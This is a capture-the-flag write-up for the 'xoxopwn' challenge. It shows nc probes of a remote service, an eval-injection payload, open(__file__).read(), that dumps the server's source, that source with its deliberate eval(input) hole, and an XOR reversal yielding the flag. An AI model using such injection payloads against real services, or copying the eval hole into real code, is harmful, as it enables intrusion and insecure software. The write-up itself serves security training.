# The task

* category: pwn
* points: 608
* name: xoxopwn

In the description we had just the remote addresses.

## Solution

This was blind task, we just had the remote address.

So first, we just connect and see how the server behaves on given inputs:

```
$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> 1+1
2

$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> 'xyz'
xyz

$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> __file__
/home/xoxopwn/xoxopwn.py
```

From that, we can assume its a Python `eval` under the hood, because it returns expressions, strings and special symbols (e.g. `__file__`).

### Lets grab source code

```
nc -v 178.128.12.234 10002


Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> open(__file__).read()
import socket
import threading
import SocketServer

host, port = '0.0.0.0', 9999

def o(a):
	secret = "392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"
	secret = secret.decode("hex")
	key = "pythonwillhelpyouopenthedoor"
	ret = ""
	for i in xrange(len(a)):
		ret += chr(ord(a[i])^ord(key[i%len(a)]))
	if ret == secret:
		print "Open the door"
	else:
		print "Close the door"


def x(a):
	xxx = "finding secret in o()"
	if len(a)>21:
		return "Big size ~"
	#print "[*] ",a
	return eval(a)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    allow_reuse_address = True

class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
    	self.request.sendall("This is function x()")
        self.request.sendall(">>> ")
        self.data = self.request.recv(1024).strip()
        print "{} wrote: {}".format(self.client_address[0],self.data)
        ret = x(str(self.data))
        self.request.sendall(str(ret))

if __name__ == "__main__":
	serverthuong123 = ThreadedTCPServer((host, port), ThreadedTCPRequestHandler)
	server_thread = threading.Thread(target=serverthuong123.serve_forever)
	server_thread.daemon = True
	server_thread.start()
	print "Server loop running in thread:", server_thread.name
	server_thread.join()
```

### Solve

The flag is probably hidden in the `o` function and so we have to reverse it. This can be done in IPython session:

```
In [1]: secret = "392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"
   ...: secret = secret.decode("hex")
   ...: key = "pythonwillhelpyouopenthedoor"
   ...: 
   ...: a = secret
   ...: 
   ...: ret = ""
   ...: for i in xrange(len(a)):
   ...:     ret += chr(ord(a[i])^ord(key[i%len(key)]))
   ...:     

In [2]: ret
Out[2]: 'ISITDTU{1412_secret_in_my_door}'
```
```
